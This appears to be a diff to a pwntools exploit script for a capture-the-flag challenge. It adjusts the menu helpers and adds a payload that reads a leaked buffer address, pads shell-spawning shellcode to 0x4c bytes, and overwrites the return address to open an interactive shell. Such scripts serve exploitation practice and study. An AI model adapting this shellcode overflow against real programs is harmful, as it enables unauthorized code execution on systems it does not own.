@@ -56,10 +56,10 @@ def dbg():
 	gdb.attach(p)
 	pause()
 
-_add,_free,_edit,_show = 1,4,2,3
-def add(index,content='a'*8):
+_add,_free,_edit,_show = 1,2,4,3
+def add(size,content='a'*8):
 	sla(':',_add)
-	sla(':',index)
+	sla(':',size)
 	sa(':',content)
 
 def free(index):
@@ -76,7 +76,10 @@ def show(index):
 	sla(':',index)
 
 # start
-
+ru('0x')
+buf = int(ru('\n'),16)
+payload = asm(shellcraft.sh()).ljust(0x4c,'a') + p32(buf)
+sla('?',payload)
 # end
 
 p.interactive()
